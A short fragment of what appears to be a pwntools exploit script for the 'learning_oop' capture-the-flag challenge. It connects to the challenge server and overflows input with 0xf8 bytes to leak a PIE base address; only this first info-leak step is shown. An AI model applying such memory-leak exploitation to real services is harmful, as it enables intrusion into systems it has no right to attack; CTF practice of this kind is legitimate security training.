...
p = remote("learning-oop-5lpgmrkv7vhv.chals.sekai.team", 1337, ssl = True)
#p = process('./learning_oop_patched')
#p = gdb.debug('./learning_oop_patched', gdbscript = script)
...
# leak pie
rcu(b"4" * 0xf8)
pie = u64(p.recv(6).ljust(8, b"\x00")) - 0x4c98
lleak("pie", pie)
